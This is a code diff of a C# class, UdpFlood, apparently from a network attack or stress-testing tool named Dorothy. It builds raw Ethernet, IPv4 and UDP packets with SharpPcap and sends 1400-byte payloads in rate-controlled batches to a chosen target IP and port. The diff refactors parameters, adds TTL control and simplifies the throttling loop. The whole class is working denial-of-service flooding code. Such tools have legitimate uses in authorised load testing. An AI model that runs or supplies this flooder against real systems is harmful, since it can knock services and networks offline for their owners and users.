@@ -9,31 +9,20 @@ using NLog;
 using PacketDotNet;
 using SharpPcap;
 using SharpPcap.LibPcap;
+using Dorothy.Models;
 
 namespace Dorothy.Models
 {
     public class UdpFlood : IDisposable
     {
         private static readonly ILogger Logger = LogManager.GetCurrentClassLogger();
-        private readonly string _sourceIp;
-        private readonly PhysicalAddress _sourceMac;
-        private readonly string _targetIp;
-        private readonly byte[] _targetMac;
-        private readonly byte[] _gatewayMac;
-        private readonly int _targetPort;
-        private readonly long _bytesPerSecond;
+        private readonly PacketParameters _params;
         private readonly CancellationToken _cancellationToken;
         private LibPcapLiveDevice? _device;
 
-        public UdpFlood(string sourceIp, byte[] sourceMac, string targetIp, byte[] targetMac, byte[] gatewayMac, int targetPort, long bytesPerSecond, CancellationToken cancellationToken)
+        public UdpFlood(PacketParameters parameters, CancellationToken cancellationToken)
         {
-            _sourceIp = sourceIp;
-            _sourceMac = new PhysicalAddress(sourceMac);
-            _targetIp = targetIp;
-            _targetMac = targetMac;
-            _gatewayMac = gatewayMac;
-            _targetPort = targetPort;
-            _bytesPerSecond = bytesPerSecond;
+            _params = parameters;
             _cancellationToken = cancellationToken;
         }
 
@@ -45,7 +34,9 @@ namespace Dorothy.Models
             {
                 _device = CaptureDeviceList.Instance
                     .OfType<LibPcapLiveDevice>()
-                    .FirstOrDefault(d => d.Addresses.Any(addr => addr.Addr.ipAddress != null && addr.Addr.ipAddress.ToString() == _sourceIp));
+                    .FirstOrDefault(d => d.Addresses.Any(addr => 
+                        addr.Addr.ipAddress != null && 
+                        addr.Addr.ipAddress.ToString() == _params.SourceIp.ToString()));
 
                 if (_device == null)
                 {
@@ -63,22 +54,19 @@ namespace Dorothy.Models
 
                 var random = new Random();
                 var ethernetPacket = new EthernetPacket(
-                    _sourceMac,
-                    new PhysicalAddress(_targetIp.Contains(".") && !IsOnSameSubnet(IPAddress.Parse(_sourceIp), IPAddress.Parse(_targetIp)) 
-                        ? _gatewayMac 
-                        : _targetMac),
+                    PhysicalAddress.Parse(BitConverter.ToString(_params.SourceMac).Replace("-", "")),
+                    PhysicalAddress.Parse(BitConverter.ToString(_params.DestinationMac).Replace("-", "")),
                     EthernetType.IPv4);
 
-                var ipPacket = new IPv4Packet(
-                    IPAddress.Parse(_sourceIp),
-                    IPAddress.Parse(_targetIp))
+                var ipPacket = new IPv4Packet(_params.SourceIp, _params.DestinationIp)
                 {
-                    Protocol = ProtocolType.Udp
+                    Protocol = PacketDotNet.ProtocolType.Udp,
+                    TimeToLive = _params.Ttl
                 };
 
                 var udpPacket = new UdpPacket(
-                    0,
-                    (ushort)_targetPort)
+                    (ushort)_params.SourcePort,
+                    (ushort)_params.DestinationPort)
                 {
                     PayloadData = new byte[1400]
                 };
@@ -88,42 +76,23 @@ namespace Dorothy.Models
                 ethernetPacket.PayloadPacket = ipPacket;
 
                 double packetSize = ethernetPacket.Bytes.Length;
-                int packetsPerSecond = (int)Math.Ceiling(_bytesPerSecond / packetSize);
+                int packetsPerSecond = (int)Math.Ceiling(_params.BytesPerSecond / packetSize);
                 int batchSize = 100;
                 double delayMicroseconds = (1_000_000.0 * batchSize) / packetsPerSecond;
 
-                Logger.Info($"UDP Flood: Sending {packetsPerSecond} packets per second ({_bytesPerSecond / 125_000} Mbps).");
+                Logger.Info($"UDP Flood: Sending {packetsPerSecond} packets per second ({_params.BytesPerSecond / 125_000} Mbps).");
 
-                await Task.Run(() =>
+                await Task.Run(async () =>
                 {
-                    var stopwatch = new System.Diagnostics.Stopwatch();
                     while (!_cancellationToken.IsCancellationRequested)
                     {
-                        try
+                        for (int i = 0; i < batchSize && !_cancellationToken.IsCancellationRequested; i++)
                         {
-                            stopwatch.Restart();
-                            for (int i = 0; i < batchSize && !_cancellationToken.IsCancellationRequested; i++)
-                            {
-                                injectionDevice.SendPacket(ethernetPacket);
-                            }
-
-                            double elapsedMicroseconds = stopwatch.ElapsedTicks * 1_000_000.0 / System.Diagnostics.Stopwatch.Frequency;
-                            if (elapsedMicroseconds < delayMicroseconds)
-                            {
-                                int remainingMicroseconds = (int)(delayMicroseconds - elapsedMicroseconds);
-                                if (remainingMicroseconds > 1000)
-                                {
-                                    Thread.Sleep(remainingMicroseconds / 1000);
-                                }
-                            }
+                            injectionDevice.SendPacket(ethernetPacket);
                         }
-                        catch (Exception ex)
-                        {
-                            Logger.Error(ex, "Failed to send UDP packet.");
-                        }
+                        await Task.Delay(TimeSpan.FromMicroseconds(delayMicroseconds));
                     }
-                    return Task.CompletedTask;
-                }, _cancellationToken);
+                });
             }
             catch (TaskCanceledException)
             {
@@ -137,35 +106,12 @@ namespace Dorothy.Models
             finally
             {
                 _device?.Close();
-                Logger.Info("UDP Flood attack stopped.");
             }
-        }
-
-        private int GenerateRandomPort()
-        {
-            return new Random().Next(1024, 65535);
         }
 
         public void Dispose()
         {
-            _device?.Dispose();
-        }
-
-        [DllImport("iphlpapi.dll", ExactSpelling = true)]
-        private static extern int SendARP(int DestIP, int SrcIP, byte[] pMacAddr, ref int PhyAddrLen);
-
-        private bool IsOnSameSubnet(IPAddress ip1, IPAddress ip2)
-        {
-            byte[] subnet = new byte[] { 255, 255, 255, 0 }; // Default subnet mask
-            byte[] bytes1 = ip1.GetAddressBytes();
-            byte[] bytes2 = ip2.GetAddressBytes();
-            
-            for (int i = 0; i < 4; i++)
-            {
-                if ((bytes1[i] & subnet[i]) != (bytes2[i] & subnet[i]))
-                    return false;
-            }
-            return true;
+            _device?.Close();
         }
     }
 } 
